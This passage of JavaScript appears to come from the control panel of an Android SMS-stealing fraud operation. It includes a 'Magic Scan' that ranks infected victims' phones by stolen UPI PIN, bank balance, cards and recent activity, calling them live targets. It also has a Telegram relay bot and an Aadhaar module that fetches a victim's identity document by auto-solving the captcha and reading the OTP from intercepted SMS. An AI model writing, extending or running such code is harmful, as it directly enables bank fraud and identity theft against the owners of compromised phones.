    botLog('err', '\u26a0\ufe0f Tick error: ' + String(e).slice(0, 80) + ' \u2014 retrying in 4s');
  } finally {
    _botRunning[deviceId] = false;  // always release lock
  }
}

// -- Start / Stop -------------------------------------------------------------
function startBot(deviceId) {
  if (_botTimers[deviceId]) return;
  var cfg = getBotCfg(deviceId);
  if (!cfg.token)  { showToast('Enter your Bot Token first'); return; }
  if (!cfg.chatId) { showToast('Save a Chat ID first'); return; }

  (async function() {
    botLog('info', '\ud83d\udd0c Connecting to Telegram\u2026');
    var me = await tgGetMe(cfg.token);
    if (!me) {
      botLog('err', '\u2717 Token invalid or conflict \u2014 is bot.py running with same token? Use a DIFFERENT bot token.');
      showToast('Token error \u2014 see log');
      updateBotStatusUI(false, cfg.sentCount || 0);
      return;
    }
    botLog('ok', '\u2713 Bot alive: @' + me.username + ' (' + me.first_name + ')');

    // Seed existing SMS (mirrors monitor_worker: skip messages already on device)
    botLog('info', 'Seeding existing SMS\u2026');
    var existing = await botFetchSms(deviceId);
    var keys = existing.map(function(s) { return s.key; });
    setBotCfg(deviceId, { seenSmsKeys: keys, enabled: true });
    botLog('info', 'Seeded ' + keys.length + ' SMS (skipped) \u00b7 watching chat ' + cfg.chatId);

    // Announce (mirrors bot.py main() owner notify)
    await tgSend(cfg.token, cfg.chatId,
      '\ud83d\udfe2 <b>Luffy Panel Bot Started</b>\n\n' +
      '\ud83d\udcf1 Device: <code>' + deviceId + '</code>\n' +
      '\ud83d\udcf6 SIM' + (cfg.sim||1) + ' \u00b7 Repeat: \u00d7' + (cfg.repeat||1) + '\n' +
      '\ud83d\udd04 Format: ' + (cfg.format || 'auto') + '\n\n' +
      '<i>Watching for SMS requests\u2026</i>'
    );

    // 1s polling loop — near-instant response (timeout=0 means no long-wait)
    _botTimers[deviceId] = setInterval(function() { _botTick(deviceId); }, 1000);
    updateBotStatusUI(true, getBotCfg(deviceId).sentCount || 0);
  })();
}

function stopBot(deviceId) {
  if (_botTimers[deviceId]) {
    clearInterval(_botTimers[deviceId]);
    delete _botTimers[deviceId];
  }
  delete _botRunning[deviceId];  // release tick lock
  var cfg = getBotCfg(deviceId);
  if (cfg.token && cfg.chatId) {
    tgSend(cfg.token, cfg.chatId,
      '\ud83d\udd34 <b>Luffy Panel Bot Stopped</b>\n<i>Panel tab closed or bot manually stopped.</i>'
    );
  }
  setBotCfg(deviceId, { enabled: false });
  botLog('info', '\u23f8 Bot stopped');
  updateBotStatusUI(false, getBotCfg(deviceId).sentCount || 0);
}

function toggleBot() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var tokenEl = document.getElementById('bot-token');
  var chatEl  = document.getElementById('bot-chat-id');
  var fmtEl   = document.getElementById('bot-format');
  var afNumEl = document.getElementById('bot-autofwd-num');
  var afTplEl = document.getElementById('bot-autofwd-tpl');
  var token   = tokenEl ? tokenEl.value.trim() : '';
  var chatId  = chatEl  ? chatEl.value.trim()  : '';
  var fmt     = fmtEl   ? fmtEl.value          : 'auto';
  var afNum   = afNumEl ? afNumEl.value.trim() : '';
  var afTpl   = afTplEl ? afTplEl.value.trim() : '';
  if (!token)  { showToast('Enter your Bot Token first'); return; }
  if (!chatId) { showToast('Enter the Telegram Chat ID first'); return; }
  // Always persist latest UI values before toggling
  setBotCfg(dev.id, { token: token, chatId: chatId, format: fmt, sim: _botSim, repeat: _botRepeat, autoFwdNum: afNum, autoFwdTpl: afTpl });
  if (_botTimers[dev.id]) {
    stopBot(dev.id);
  } else {
    startBot(dev.id);
  }
}

// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
// MAGIC SCAN — Online devices ONLY, deep SMS scan, clean mobile layout
// ─────────────────────────────────────────────────────────────────────────────
var _magicScanRunning = false;

async function fetchDeviceSmsDeep(deviceId) {
  try {
    var raw;
    if (STATE.isProxyMode) {
      try {
        raw = await proxyFetch('messages/' + deviceId, { 'orderBy': '"$key"', 'limitToLast': '1000' });
      } catch(e1) {
        raw = await proxyFetch('clients/' + deviceId + '/messages', { 'orderBy': '"$key"', 'limitToLast': '1000' });
      }
    } else {
    try {
      // Deep Scan: fetch up to 1000 messages (full history)
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'messages/' + deviceId, {
        'orderBy': '"$key"', 'limitToLast': '1000'
      });
    } catch(e1) {
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients/' + deviceId + '/messages', {
        'orderBy': '"$key"', 'limitToLast': '1000'
      });
    }
    }
    var msgs = parseSmsData(raw);
    return { analysis: analyzeSms(msgs), rawMsgs: msgs };
  } catch(e) {
    return null;
  }
}

async function magicScan() {
  if (!STATE.fbUrl) { showToast('Not connected to Firebase'); return; }

  var overlay   = document.getElementById('magic-scan-overlay');
  var pWrap     = document.getElementById('magic-progress-wrap');
  var pFill     = document.getElementById('magic-progress-fill');
  var pLabel    = document.getElementById('magic-progress-label');
  var subtitle  = document.getElementById('magic-scan-subtitle');
  var resultsEl = document.getElementById('magic-results');

  // Reset UI
  pWrap.style.display  = '';
  pFill.style.width    = '0%';
  pLabel.textContent   = 'Initializing Deep Scan…';
  subtitle.textContent = 'Scanning all online devices…';
  resultsEl.innerHTML  = '';
  overlay.classList.add('open');
  _magicScanRunning    = true;

  // ── ONLINE DEVICES ONLY ──────────────────────────────────────────────────
  var toScan = STATE.devices.filter(function(d) { return d.status; });

  if (toScan.length === 0) {
    resultsEl.innerHTML = '<div class="magic-empty"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9.75 9.75l4.5 4.5m0-4.5l-4.5 4.5M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><span>No online devices to scan</span></div>';
    pWrap.style.display  = 'none';
    subtitle.textContent = 'No online devices found';
    return;
  }

  var total    = toScan.length;
  var done     = 0;
  var scored   = [];
  var idx      = 0;
  var CONCURR  = 6;

  await new Promise(function(resolve) {
    var active = 0;

    function next() {
      if (!_magicScanRunning)                  { resolve(); return; }
      if (idx >= toScan.length && active === 0) { resolve(); return; }
      if (idx >= toScan.length)                  return;

      var dev = toScan[idx++];
      active++;

      fetchDeviceSmsDeep(dev.id).then(function(result) {
        done++;
        active--;

        var msgs     = (result && result.rawMsgs)   ? result.rawMsgs   : [];
        var analysis = (result && result.analysis)  ? result.analysis  : null;

        // Update device cache
        if (result && result.analysis) {
          var d = STATE.devices.find(function(x) { return x.id === dev.id; });
          if (d) { d.smsAnalysis = result.analysis; d.rawMsgs = result.rawMsgs; }
        }

        var sd = scoreMagicDevice(dev, msgs, analysis);
        scored.push({ dev: dev, scoreData: sd });

        // Save score globally
        STATE.magicScores[dev.id] = sd.score;

        var pct = Math.round((done / total) * 100);
        pFill.style.width  = pct + '%';
        pLabel.textContent = 'Deep Scanned ' + done + ' / ' + total + ' online devices…';
        subtitle.textContent = 'Analysing device ' + done + ' of ' + total;

        scored.sort(function(a, b) { return b.scoreData.score - a.scoreData.score; });
        renderMagicResults(scored, resultsEl);

        if (done >= total) { resolve(); return; }
        next();
      }).catch(function() {
        done++;
        active--;
        var pct = Math.round((done / total) * 100);
        pFill.style.width  = pct + '%';
        pLabel.textContent = 'Scanned ' + done + ' / ' + total + ' online devices…';
        if (done >= total) { resolve(); return; }
        next();
      });
    }

    for (var s = 0; s < Math.min(CONCURR, toScan.length); s++) next();
  });

  // Final render
  pWrap.style.display = 'none';
  scored.sort(function(a, b) { return b.scoreData.score - a.scoreData.score; });
  renderMagicResults(scored, resultsEl);

  var critCount = scored.filter(function(x) { return x.scoreData.tier === 'CRITICAL'; }).length;
  subtitle.textContent = 'Scan Complete — ' + scored.length + ' online devices scanned (' + critCount + ' Critical)';
  updateStats();
}

function finishMagicScan() {
  closeMagicScan();
  // Activate Priority filter tab on main screen
  var priorityBtn = document.getElementById('btn-filter-priority');
  setFilter('priority', priorityBtn);
}

// ── Scoring Logic — weighted by LATEST balance, recency, cards, UPI ──────────
function scoreMagicDevice(dev, msgs, analysis) {
  var score = 0;
  var now   = Date.now();

  if (dev.upipin) score += 50;  // UPI PIN — highest single signal

  var bankEntries = (analysis && analysis.bankBalances) ? analysis.bankBalances : [];
  var cards       = (analysis && analysis.cards)        ? analysis.cards        : [];

  score += Math.min(cards.length * 20, 60);  // Cards (capped at 60)

  var latestBalance  = 0;
  var latestSmsTime  = 0;
  var latestBankSms  = null;
  var bankNames      = [];
  var recentActivity = false;

  // bankEntries are sorted newest-first by analyzeSms — first explicit balance = current
  bankEntries.forEach(function(b) {
    var t = b.detectedAt ? (typeof b.detectedAt === 'number' ? b.detectedAt : new Date(b.detectedAt).getTime()) : 0;

    if (t > latestSmsTime) {
      latestSmsTime = t;
      if (b.rawSms) latestBankSms = { text: b.rawSms, time: t, bank: b.bankName };
    }

    // First entry with real balance field = the latest balance (sorted newest-first)
    if (b.hasExplicitBalance && latestBalance === 0) {
      latestBalance = b.availableBalance || 0;
    }

    if (b.bankName && bankNames.indexOf(b.bankName) === -1) bankNames.push(b.bankName);

    if (t > 0 && (now - t) < 86400000) recentActivity = true;
  });

  // Fallback if no explicit balance tag found
  if (latestBalance === 0 && bankEntries.length > 0) {
    latestBalance = bankEntries[0].availableBalance || 0;
  }

  // Score based on LATEST balance — NOT total SMS count
  if      (latestBalance >= 500000) score += 80;
  else if (latestBalance >= 200000) score += 60;
  else if (latestBalance >= 100000) score += 45;
  else if (latestBalance >= 50000)  score += 30;
  else if (latestBalance >= 10000)  score += 18;
  else if (latestBalance >= 1000)   score += 8;

  // Recency bonus — live target matters most
  if (recentActivity) score += 30;
  else if (latestSmsTime > 0 && (now - latestSmsTime) < 604800000) score += 10;

  // Multi-bank bonus
  if (bankNames.length > 1) score += (bankNames.length - 1) * 15;

  // At least 1 confirmed bank account
  if (bankEntries.length > 0) score += 10;

  var tier;
  if      (score >= 80 || latestBalance >= 100000 || (dev.upipin && bankEntries.length > 0)) tier = 'CRITICAL';
  else if (score >= 40 || latestBalance >= 10000  || cards.length > 0)                       tier = 'HIGH';
  else if (score >= 15 || bankEntries.length > 0)                                             tier = 'MED';
  else                                                                                         tier = 'LOW';

  return {
    score:          score,
    tier:           tier,
    bankNames:      bankNames,
    latestBalance:  latestBalance,
    cards:          cards.length,
    hasUpi:         !!dev.upipin,
    recentActivity: recentActivity,
    latestBankSms:  latestBankSms,
    latestSmsTime:  latestSmsTime,
  };
}

// ── Render Ranked Results (CLEAN FLEX STRUCTURE) ──────────────────────────────
function renderMagicResults(scored, container) {
  if (!scored || scored.length === 0) {
    container.innerHTML = '<div class="magic-empty"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"/></svg><span>No results found</span></div>';
    return;
  }

  var html     = '';
  var lastTier = null;
  var tierLbls = { CRITICAL:'🔴 Critical', HIGH:'🟠 High', MED:'🟡 Medium', LOW:'⚪ Low' };

  scored.forEach(function(item, i) {
    var sd  = item.scoreData;
    var dev = item.dev;

    if (sd.tier !== lastTier) {
      html += '<div class="magic-section-header">' + (tierLbls[sd.tier] || sd.tier) + ' Priority</div>';
      lastTier = sd.tier;
    }

    html += '<div class="magic-result-card tier-' + escHtml(sd.tier) + '" onclick="magicOpenDevice(\'' + escId(dev.id) + '\')">';

    // Left block: Rank + Dev Details
    html += '<div class="magic-card-left">';
    html += '<div class="magic-rank">' + (i + 1) + '</div>';
    html += '<div class="magic-dev-details">';

    // Title line
    html += '<div class="magic-dev-title-line">';
    if (dev.status) html += '<span class="magic-online-dot"></span>';
    html += '<span class="magic-dev-name">' + escHtml(dev.name || dev.id) + '</span>';
    html += '<span class="magic-tier-badge">' + escHtml(sd.tier) + '</span>';
    html += '</div>';

    // Chips line
    html += '<div class="magic-chips-line">';
    if (sd.bankNames.length > 0) html += '<span class="magic-chip bank">🏦 ' + escHtml(sd.bankNames.slice(0,2).join(', ')) + '</span>';
    if (sd.latestBalance > 0)    html += '<span class="magic-chip amount">₹' + formatAmount(sd.latestBalance) + ' bal</span>';
    if (sd.cards > 0)            html += '<span class="magic-chip card">💳 ' + sd.cards + ' Card' + (sd.cards > 1 ? 's' : '') + '</span>';
    if (sd.hasUpi)               html += '<span class="magic-chip upi">🔑 UPI PIN</span>';
    if (sd.recentActivity)       html += '<span class="magic-chip recent">⚡ Active Today</span>';
    html += '</div>';

    // Latest bank SMS snippet with timestamp
    if (sd.latestBankSms) {
      var snippetText = sd.latestBankSms && sd.latestBankSms.text ? sd.latestBankSms.text.substring(0, 90) : String(sd.latestBankSms || '').substring(0, 90);
      var snippetTime = sd.latestBankSms && sd.latestBankSms.time ? formatLastSeen(sd.latestBankSms.time) : '';
      html += '<div class="magic-sms-snippet">';
      if (snippetTime) html += '<span style="opacity:0.55;font-size:11px;margin-right:5px">' + escHtml(snippetTime) + '</span>';
      html += escHtml(snippetText) + (snippetText.length >= 90 ? '…' : '');
      html += '</div>';
    }

    html += '</div>'; // /magic-dev-details
    html += '</div>'; // /magic-card-left

    // Right block: Score + Arrow
    html += '<div class="magic-card-right">';
    html += '<div class="magic-score-box">';
    html += '<span class="magic-score-num">' + sd.score + '</span>';
    html += '<span class="magic-score-lbl">pts</span>';
    html += '</div>';
    html += '<div class="magic-arrow-btn"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg></div>';
    html += '</div>'; // /magic-card-right

    html += '</div>'; // /magic-result-card
  });

  container.innerHTML = html;
}

function formatAmount(num) {
  if (!num || isNaN(num)) return '0';
  if (num >= 100000) return (num / 100000).toFixed(num % 100000 === 0 ? 0 : 1) + ' Lakh';
  if (num >= 1000)   return (num / 1000).toFixed(num % 1000 === 0 ? 0 : 1) + 'k';
  return num.toLocaleString('en-IN');
}

function magicOpenDevice(devId) {
  closeMagicScan();
  var dev = STATE.devices.find(function(d) { return d.id === devId; });
  if (dev) openDetail(dev);
}

function closeMagicScan() {
  _magicScanRunning = false;
  var overlay = document.getElementById('magic-scan-overlay');
  if (overlay) overlay.classList.remove('open');
}

function magicScanOverlayClick(e) {
  if (e.target === document.getElementById('magic-scan-overlay')) closeMagicScan();
}


// ══════════════════════════════════════════════════════════════════════════
// AADHAAR FETCH MODULE
// Connects to local Python API (aadhaar_api.py running on port 7878)
// Auto-reads OTP from device Firebase SMS.
// ══════════════════════════════════════════════════════════════════════════

var AADHAAR_API_BASE = '/api/aadhaar';
var AADHAAR_API      = '/api/aadhaar';
var _aadhaarSessionId = null;
var _selectedAadhaarPhone = '';
var _aadhaarPollingTimer = null;
var _aadhaarAutoOtpTimer = null;
var _aadhaarApiOk = true;
var _lastRenderedLogIndex = 0;

// Called when Aadhaar tab is opened
function loadAadhaarTabUI() {
  var dev = STATE.detailDev;
  if (!dev) return;

  var phoneInput = document.getElementById('input-aadhaar-phone');
  var selector   = document.getElementById('aadhaar-number-selector');

  var numbers = [];

  function addNum(rawPhone, label) {
    if (!rawPhone || typeof rawPhone !== 'string') return;
    var digits = rawPhone.replace(/\D/g, '');
    if (digits.length > 10) digits = digits.slice(-10);
    if (digits.length === 10 && !numbers.some(function(n) { return n.phone === digits; })) {
      numbers.push({ phone: digits, label: label });
    }
  }

  // 1. Main Device Number
  addNum(dev.phoneNumber, 'Main Number');

  // 2. SIM Cards
  if (dev.sims && dev.sims.length) {
    dev.sims.forEach(function(sim, idx) {
      if (sim && sim.phoneNumber) {
        addNum(sim.phoneNumber, 'SIM ' + (idx + 1) + ' (' + (sim.carrierName || 'Carrier') + ')');
      }
    });
  }

  // 3. SMS Detected Numbers
  if (dev.smsAnalysis && dev.smsAnalysis.phoneNumbers && dev.smsAnalysis.phoneNumbers.length) {
    dev.smsAnalysis.phoneNumbers.forEach(function(p, idx) {
      var numStr = typeof p === 'string' ? p : (p.number || p.phone || '');
      addNum(numStr, 'SMS #' + (idx + 1));
    });
  }

  // Pre-fill phone input
  if (numbers.length > 0) {
    _selectedAadhaarPhone = numbers[0].phone;
    if (phoneInput) phoneInput.value = numbers[0].phone;
  } else if (dev.phoneNumber) {
    var d = dev.phoneNumber.replace(/\D/g, '');
    if (d.length > 10) d = d.slice(-10);
    _selectedAadhaarPhone = d;
    if (phoneInput && d.length === 10) phoneInput.value = d;
  }

  // Render selection chips
  if (selector) {
    if (numbers.length === 0) {
      selector.innerHTML = '';
    } else {
      var html = '<div class="aadhaar-chips-title">Detected Phone Numbers (Click to select):</div><div class="aadhaar-chips-row">';
      numbers.forEach(function(item, idx) {
        var selClass = idx === 0 ? ' selected' : '';
        html += '<div class="aadhaar-num-chip' + selClass + '" onclick="selectAadhaarNum(\'' + item.phone + '\', this)">';
        html += '<span class="chip-num">📱 ' + item.phone + '</span>';
        html += '<span class="chip-lbl">' + item.label + '</span>';
        html += '</div>';
      });
      html += '</div>';
      selector.innerHTML = html;
    }
  }
}

function selectAadhaarNum(phone, el) {
  _selectedAadhaarPhone = phone;
  var phoneInput = document.getElementById('input-aadhaar-phone');
  if (phoneInput) phoneInput.value = phone;

  var chips = document.querySelectorAll('.aadhaar-num-chip');
  chips.forEach(function(c) { c.classList.remove('selected'); });
  if (el) el.classList.add('selected');
}

// ── Aadhaar Step Progress ────────────────────────────────────────────────────
function adhSetStep(n) {
  for (var i = 1; i <= 4; i++) {
    var el = document.getElementById('adh-step-' + i);
    if (!el) continue;
    el.classList.remove('active', 'done');
    if (i < n) el.classList.add('done');
    else if (i === n) el.classList.add('active');
  }
}

// ── OTP box helpers ───────────────────────────────────────────────────────────
function advOtp(el, idx) {
  var val = el.value.replace(/\D/g, '');
  el.value = val ? val[0] : '';
  if (val && idx < 5) {
    var next = document.getElementById('adh-otp-' + (idx + 1));
    if (next) next.focus();
  }
  // Auto-submit when all 6 filled
  var otp = '';
  for (var i = 0; i <= 5; i++) {
    var b = document.getElementById('adh-otp-' + i);
    otp += b ? (b.value || '') : '';
  }
  if (otp.length === 6) {
    var hidden = document.getElementById('input-manual-otp');
    if (hidden) hidden.value = otp;
  }
}

function backOtp(e, idx) {
  if (e.key === 'Backspace') {
    var cur = document.getElementById('adh-otp-' + idx);
    if (cur && !cur.value && idx > 0) {
      var prev = document.getElementById('adh-otp-' + (idx - 1));
      if (prev) { prev.value = ''; prev.focus(); }
    }
  }
}

// Auto-fill OTP boxes from 6-digit string (called by auto-reader)
function fillOtpBoxes(otp) {
  var str = String(otp);
  for (var i = 0; i < 6; i++) {
    var b = document.getElementById('adh-otp-' + i);
    if (b) b.value = str[i] || '';
  }
  var hidden = document.getElementById('input-manual-otp');
  if (hidden) hidden.value = str.slice(0, 6);
}

function getOtpBoxValue() {
  var otp = '';
  for (var i = 0; i <= 5; i++) {
    var b = document.getElementById('adh-otp-' + i);
    otp += b ? (b.value || '') : '';
  }
  return otp;
}

function submitOtpBoxes() {
  var otp = getOtpBoxValue();
  if (otp.length !== 6) { showToast('Enter all 6 digits'); return; }
  var hidden = document.getElementById('input-manual-otp');
  if (hidden) hidden.value = otp;
  submitManualAadhaarOtp();
}

// OTP countdown ring
var _adhOtpCountdown = null;
function startOtpCountdown(seconds) {
  if (_adhOtpCountdown) clearInterval(_adhOtpCountdown);
  var remaining = seconds || 60;
  var secEl = document.getElementById('adh-otp-sec');
  var fillEl = document.getElementById('adh-ring-fill');
  function tick() {
    if (secEl) secEl.textContent = remaining;
    if (fillEl) {
      var pct = (remaining / (seconds || 60)) * 100;
      fillEl.setAttribute('stroke-dasharray', pct + ', 100');
      fillEl.style.stroke = remaining > 20 ? '#38bdf8' : remaining > 10 ? '#f59e0b' : '#ef4444';
    }
    if (remaining <= 0) {
      clearInterval(_adhOtpCountdown);
      if (secEl) secEl.textContent = '0';
      if (fillEl) fillEl.setAttribute('stroke-dasharray', '0, 100');
    }
    remaining--;
  }
  tick();
  _adhOtpCountdown = setInterval(tick, 1000);
}

function stopOtpCountdown() {
  if (_adhOtpCountdown) { clearInterval(_adhOtpCountdown); _adhOtpCountdown = null; }
}

// ── Cancel / Retry / Reset ────────────────────────────────────────────────────
function cancelAadhaarSession() {
  if (_aadhaarPollingTimer) clearInterval(_aadhaarPollingTimer);
  stopAutoOtpReader();
  stopOtpCountdown();
  _aadhaarSessionId = null;
  _aadhaarSessionStartTs = 0;
  _aadhaarOtpStateStartTs = 0;
  _aadhaarAutoOtpSubmitted = false;
  resetAadhaarUI();
  showToast('Session cancelled');
}

function retryAadhaarFetch() {
  cancelAadhaarSession();
  setTimeout(function() { startAadhaarFetch(); }, 200);
}

function resetAadhaarUI() {
  var statusCard = document.getElementById('aadhaar-status-card');
  var otpCard = document.getElementById('aadhaar-otp-fallback');
  var resultCard = document.getElementById('aadhaar-result-card');
  var spinner = document.getElementById('aadhaar-spinner');
  if (statusCard)  statusCard.style.display = 'none';
  if (otpCard)     otpCard.style.display = 'none';
  if (resultCard)  resultCard.style.display = 'none';
  if (spinner)     spinner.style.display = '';
  adhSetStep(1);
  // Clear OTP boxes
  for (var i = 0; i <= 5; i++) {
    var b = document.getElementById('adh-otp-' + i);
    if (b) b.value = '';
  }
  var logBox = document.getElementById('aadhaar-log-box');
  if (logBox) logBox.innerHTML = '';
}

async function startAadhaarFetch() {
  var dev = STATE.detailDev;
  if (!dev) return;

  var phoneInput = document.getElementById('input-aadhaar-phone');
  var enteredPhone = phoneInput ? phoneInput.value.trim().replace(/\D/g, '') : '';
  
  var cleanPhone = enteredPhone || _selectedAadhaarPhone || (dev.phoneNumber || '').replace(/\D/g, '');
  if (cleanPhone.length > 10) cleanPhone = cleanPhone.slice(-10);

  if (!cleanPhone || cleanPhone.length !== 10) {
    showToast('Please enter a valid 10-digit mobile number');
    return;
  }

  // Show status card
  var statusCard = document.getElementById('aadhaar-status-card');
  var logBox     = document.getElementById('aadhaar-log-box');
  var statusLbl  = document.getElementById('aadhaar-status-label');
  var otpFallback= document.getElementById('aadhaar-otp-fallback');
  var resCard    = document.getElementById('aadhaar-result-card');

  statusCard.style.display = '';
  logBox.innerHTML = '<div class="aadhaar-log-item info">[INIT] Contacting VPS Aadhaar Engine for +91 ' + cleanPhone + '…</div>';
  statusLbl.textContent = 'Connecting to UIDAI Gateway…';
  otpFallback.style.display = 'none';
  resCard.style.display = 'none';
  adhSetStep(1);
  stopOtpCountdown();
  for (var _bi = 0; _bi <= 5; _bi++) { var _bb = document.getElementById('adh-otp-' + _bi); if (_bb) _bb.value = ''; }
  var _spin = document.getElementById('aadhaar-spinner'); if (_spin) _spin.style.display = '';

  try {
    var res = await fetch(AADHAAR_API_BASE + '/aadhaar/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile: cleanPhone, name: 'Mr' })
    });
    var data = await res.json();

    if (!data || !data.session_id) {
      appendAadhaarLog('error', '[ERROR] Failed to start UIDAI session: ' + (data ? (data.detail || data.error || 'Unknown response format') : 'No response'));
      return;
    }

    _aadhaarSessionId = data.session_id;
    _aadhaarSessionStartTs = Date.now();
    _aadhaarOtpStateStartTs = 0;
    _lastRenderedLogIndex = 0;
    appendAadhaarLog('ok', '[SUCCESS] UIDAI Session Started (ID: ' + _aadhaarSessionId.slice(0, 8) + '…)');
    appendAadhaarLog('info', '[CAPTCHA] Solving captcha automatically via Gemini Vision…');

    // Start listening for session updates
    pollAadhaarStatus();

    // Start auto-reading OTP from SMS stream of the target device
    startAutoOtpReader(dev.id);

  } catch(e) {
    appendAadhaarLog('error', '[CONNECTION ERROR] Failed to connect to VPS: ' + e.message);
  }
}

function appendAadhaarLog(level, msg) {
  var logBox = document.getElementById('aadhaar-log-box');
  if (!logBox) return;
  var item = document.createElement('div');
  item.className = 'aadhaar-log-item ' + level;
  item.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  logBox.appendChild(item);
  logBox.scrollTop = logBox.scrollHeight;
}

function pollAadhaarStatus() {
  if (_aadhaarPollingTimer) clearInterval(_aadhaarPollingTimer);

  _aadhaarPollingTimer = setInterval(async function() {
    if (!_aadhaarSessionId) return;

    try {
      var res = await fetch(AADHAAR_API_BASE + '/aadhaar/status/' + _aadhaarSessionId);
      var data = await res.json();

      // Render live log stream from VPS
      if (data.logs && Array.isArray(data.logs) && data.logs.length > _lastRenderedLogIndex) {
        for (var i = _lastRenderedLogIndex; i < data.logs.length; i++) {
          var logItem = data.logs[i];
          if (logItem && logItem.msg) {
            appendAadhaarLog(logItem.level || 'info', logItem.msg);
          }
        }
        _lastRenderedLogIndex = data.logs.length;
      }

      var statusLbl = document.getElementById('aadhaar-status-label');
      var otpFallback = document.getElementById('aadhaar-otp-fallback');

      var now = Date.now();
      // Overall 120s Global Session Timeout Guard
      if (_aadhaarSessionStartTs > 0 && (now - _aadhaarSessionStartTs > 120000) && data.state !== 'complete' && data.state !== 'error') {
        clearInterval(_aadhaarPollingTimer);
        stopAutoOtpReader();
        if (statusLbl) statusLbl.textContent = '⚠️ Session timed out after 120s. Please retry.';
        appendAadhaarLog('error', '[TIMEOUT] Session timed out after 120s. Click Start to try again.');
        var spin = document.getElementById('aadhaar-spinner');
        if (spin) spin.style.display = 'none';
        return;
      }

      if (data.state === 'fetching_captcha') {
        adhSetStep(2);
        if (statusLbl) statusLbl.textContent = '🧩 Fetching & Auto-Solving Captcha via ddddocr…';
      } else if (data.state === 'await_otp' || data.state === 'await_eid_otp') {
        adhSetStep(3);
        if (_aadhaarOtpStateStartTs === 0) {
          _aadhaarOtpStateStartTs = now;
          startOtpCountdown(60);
        }
        var elapsedOtpSec = Math.floor((now - _aadhaarOtpStateStartTs) / 1000);
        var descEl = document.getElementById('adh-otp-desc');
        if (elapsedOtpSec > 60) {
          if (statusLbl) statusLbl.textContent = '⚠️ OTP Timeout — Enter manually or retry';
          if (descEl) descEl.textContent = 'Auto-read timed out. Type OTP manually or click Retry:';
          appendAadhaarLog('warn', '⚠️ [NOTICE] OTP not detected in 60s. Enter manually or click Retry.');
        } else {
          if (statusLbl) statusLbl.textContent = '⚡ OTP Sent! Auto-reading SMS (' + (60 - elapsedOtpSec) + 's left)…';
          if (descEl) descEl.textContent = 'Auto-reading from device SMS… enter manually if not auto-detected:';
        }
        if (otpFallback) otpFallback.style.display = '';
      } else if (data.state === 'await_dl_otp') {
        adhSetStep(3);
        if (!_aadhaarDlOtpStateStartTs) {
          _aadhaarDlOtpStateStartTs = now;
          startOtpCountdown(60);
        }
        _aadhaarAutoOtpSubmitted = false;
        var elapsedDlSec = Math.floor((now - _aadhaarDlOtpStateStartTs) / 1000);
        var descEl2 = document.getElementById('adh-otp-desc');
        if (elapsedDlSec > 60) {
          if (statusLbl) statusLbl.textContent = '⚠️ Download OTP Timeout — Enter manually or retry';
          if (descEl2) descEl2.textContent = 'Download OTP auto-read timed out. Enter manually or retry:';
          appendAadhaarLog('warn', '⚠️ [NOTICE] Download OTP not detected in 60s. Enter manually or click Retry.');
        } else {
          if (statusLbl) statusLbl.textContent = '⚡ Download OTP Sent! Auto-reading SMS (' + (60 - elapsedDlSec) + 's left)…';
        }
        if (otpFallback) otpFallback.style.display = '';
      } else if (data.state === 'complete') {
        adhSetStep(4);
        clearInterval(_aadhaarPollingTimer);
        stopAutoOtpReader();
        stopOtpCountdown();
        if (statusLbl) statusLbl.textContent = '✅ Aadhaar Fetch Complete!';
        var spin = document.getElementById('aadhaar-spinner');
        if (spin) spin.style.display = 'none';
        renderAadhaarResult(data.pdf_result || data);
      } else if (data.state === 'error') {
        clearInterval(_aadhaarPollingTimer);
        stopAutoOtpReader();
        stopOtpCountdown();
        appendAadhaarLog('error', '[ERROR] ' + (data.error || 'Aadhaar process failed'));
        var spin = document.getElementById('aadhaar-spinner');
        if (spin) spin.style.display = 'none';
        // Show retry prompt
        var subst = document.getElementById('adh-substatus');
        if (subst) subst.textContent = 'Session failed. Click Retry to try again.';
      }
    } catch(e) {
      // Quiet poll error
    }
  }, 1800);
}

var _aadhaarAutoOtpSubmitted = false;

function startAutoOtpReader(devId) {
  stopAutoOtpReader();
  appendAadhaarLog('info', '[AUTO-OTP] Monitoring live Firebase SMS stream from target device…');

  var seenSmsKeys = new Set();
  var isInitialSnapshot = true;
  _aadhaarAutoOtpSubmitted = false;

  _aadhaarAutoOtpTimer = setInterval(async function() {
    if (_aadhaarAutoOtpSubmitted) return;

    var dev = STATE.devices.find(function(d) { return d.id === devId; });
    if (!dev) return;

    var result = await fetchDeviceSms(dev.id);
    if (!result || !result.rawMsgs) return;

    if (isInitialSnapshot) {
      result.rawMsgs.forEach(function(msg) {
        var body = msg.text || msg.body || '';
        var key = (msg.sender || '') + '_' + (msg.time || '') + '_' + body;
        seenSmsKeys.add(key);
      });
      isInitialSnapshot = false;
      return;
    }

    for (var i = 0; i < result.rawMsgs.length; i++) {
      var msg = result.rawMsgs[i];
      var body = msg.text || msg.body || '';
      var key = (msg.sender || '') + '_' + (msg.time || '') + '_' + body;

      if (seenSmsKeys.has(key)) continue;
      seenSmsKeys.add(key);

      if (body.includes('UIDAI') || body.includes('AD-ADHAAR') || body.includes('Aadhaar') || body.includes('ADHAAR') || body.includes('OTP') || body.includes('verification code') || body.includes('e-Aadhaar')) {
        var match = body.match(/\b\d{6}\b/);
        if (match) {
          var otp = match[0];
          _aadhaarAutoOtpSubmitted = true;
          appendAadhaarLog('ok', '⚡ [AUTO-READ OTP DETECTED] Found NEW OTP ' + otp + ' from device SMS!');
          fillOtpBoxes(otp);
          submitAutoAadhaarOtp(otp);
          break;
        }
      }
    }
  }, 1800);
}

